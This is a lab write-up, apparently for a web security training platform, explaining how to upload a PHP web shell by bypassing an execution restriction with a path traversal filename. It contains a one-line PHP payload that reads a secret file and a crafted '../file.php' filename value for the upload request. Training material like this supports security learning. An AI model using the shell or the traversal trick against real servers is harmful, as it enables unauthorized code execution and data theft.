# Web shell upload via path traversal
* This lab contains a vulnerable image upload function. The server is configured to prvent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
	* To solve the lab, upload a basic PHP web shell and use it ot exfiltrate the contents of the file `/home/carlos/secret`. Submit the secret using the button provided in the lab banner
	* You can log in to your own account using _wiener:peter_

### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file, capture the request and send the request to repeater to modify
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* Capturet the request when click the "Upload" button, and send the request to repeater

![92](https://user-images.githubusercontent.com/53956303/152082456-da841e05-4dc3-4564-b683-f2a600a09edb.png)
### 3. Modify file name using a directory traversal sequnce
* By using a directory traversal sequnce, an attacker can upload the file to unexpected location to bypass the execution protection on the target machine.
	* Modify _filename_ parameter in _Content-Disposition_ using a directory traversal sqeunce
	* URL encode to use!
```http
filename=../file.php
```
* The file is successfully uploaded at `avatars/../files.php`, which meand the _file.php_ is uploaded to the parent directory of _avatars_

![93](https://user-images.githubusercontent.com/53956303/152083136-ffcf5d2d-781c-4089-9061-8ec7707f2eed.png)
	* From the unmodified-uploaded file, the _avatars_'s parent directory _files_ is found

![94](https://user-images.githubusercontent.com/53956303/152083186-cc17f55b-e9e3-4261-ba4b-d8973a59ddee.png)
### 4. Execute the upload web shell
* Navigate to this URL using a browser
```http
https://ac1e1f2f1ec4951ec1ab3c3600330040.web-security-academy.net/files/file.php
```
* As a result, the PHP script is being executed and the secret key is given

![95](https://user-images.githubusercontent.com/53956303/152083424-bcbcaf71-8cea-41b6-8203-76486e58c0ce.png)
* By submitting the key, the lab is solved

![96](https://user-images.githubusercontent.com/53956303/152083485-8ae528d3-297a-4301-91a6-d9b549239020.png)

